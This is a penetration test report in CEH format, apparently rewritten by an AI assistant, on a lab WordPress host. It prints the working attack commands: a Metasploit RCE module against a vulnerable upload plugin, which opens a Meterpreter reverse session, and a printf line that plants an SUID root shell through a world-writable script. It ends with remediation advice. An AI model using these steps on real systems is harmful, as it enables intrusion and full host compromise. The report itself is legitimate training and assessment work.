Got it. I’ll rewrite the report in **English**, keeping the **CEH reporting framework structure** and all your findings intact.

---

# CEH Penetration Test Report

## Engagement Overview

**Target:** `192.168.0.2 (draggle.svk)`
**Date of Test:** 23.08.2025
**Scope:** Web application (WordPress) and services exposed on the target host.
**Objective:** Identify vulnerabilities, confirm exploitability, and assess the possibility of privilege escalation.

---

## Reconnaissance

### Network Scanning

Command:

```bash
nmap -sV -sT 192.168.0.2
```

**Output:**

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
```

**Findings:**

* Host is online.
* Service **Apache 2.4.38 (Debian)** on port 80/tcp.
* Service **MariaDB 10.3.23** on port 3306/tcp (unauthorized access denied).

---

## Enumeration

### Web Application Analysis

Domain `draggle.svk` was added to the hosts file.
Accessing the site in a browser confirmed it is running on **WordPress**.

Enumeration with **WPScan**:

```bash
wpscan --url http://draggle.svk
```

**Key Findings:**

* WordPress Core: **v6.0.1 (outdated, insecure)**
* Theme: **Twenty Twenty-Two v1.0** (outdated, latest v1.9)
* Plugins:

  * `contact-form-7 v5.1.9` (outdated, latest v6.0.3)
  * `drag-and-drop-multiple-file-upload-contact-form-7 v1.3.3.2` (**vulnerable to RCE, Exploit-DB 48520**)

---

## Exploitation

### Remote Code Execution (RCE) via drag-and-drop-multiple-file-upload-contact-form-7

Used Metasploit module:

```bash
use exploit/multi/http/wp_dnd_mul_file_rce
set RHOSTS draggle.svk
set RPORT 80
set TARGETURI /
set LHOST 192.168.0.1
run
```

**Console Output:**

```
[+] Payload uploaded successfully
[*] Sending stage (40004 bytes) to 192.168.0.2
[+] Meterpreter session 1 opened (192.168.0.1:4444 -> 192.168.0.2:36294)
```

**Result:** Remote Code Execution confirmed, **Meterpreter session established**.

---

## Post-Exploitation

### Privilege Escalation Enumeration

Uploaded and executed **linpeas.sh**.

**Privilege escalation opportunity identified:**

```
/opt/script.sh
-rwxrwxrwx 1 root root 29 May 16  2024 script.sh
```

File content:

```bash
#!/bin/bash
rm /tmp/*.sh -rf
```

File is **world-writable**.
Modified with:

```bash
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash\n' > /opt/script.sh
```

**Result:** Attacker can create an SUID root shell, achieving **full system compromise**.

---

## Findings

1. **Outdated WordPress Core** → contains known public vulnerabilities.
2. **Plugin drag-and-drop-multiple-file-upload-contact-form-7 v1.3.3.2** → confirmed RCE exploit (Exploit-DB 48520).
3. **Misconfigured permissions on /opt/script.sh** → allows privilege escalation to root.

---

## Risk Assessment

| Finding                                    | Risk Level | Impact                                | Exploitability    |
| ------------------------------------------ | ---------- | ------------------------------------- | ----------------- |
| Outdated WordPress Core                    | Medium     | Possible SQLi/XSS/RCE via public CVEs | High              |
| Vulnerable plugin (RCE)                    | Critical   | Full control of site & host           | Confirmed Exploit |
| Misconfigured permissions (/opt/script.sh) | High       | Root privilege escalation             | Confirmed Exploit |

---

## Recommendations

1. **Update WordPress Core** to the latest stable release.
2. **Update or remove all outdated plugins/themes**.
3. **Remove or replace the vulnerable plugin drag-and-drop-multiple-file-upload-contact-form-7**.
4. Fix permissions on **/opt/script.sh**:

   ```bash
   chmod 700 /opt/script.sh
   chown root:root /opt/script.sh
   ```

   or remove the script entirely if not required.
5. Deploy a **Web Application Firewall (WAF)** and enforce regular vulnerability scanning.

---

## Conclusion

During the assessment:

* Multiple outdated and vulnerable components were identified in WordPress.
* Successful exploitation of a plugin resulted in **remote code execution**.
* A misconfiguration in system permissions enabled **privilege escalation to root**.

**Final Outcome:** An attacker can gain **full administrative control** over the system and database. Immediate remediation is required.
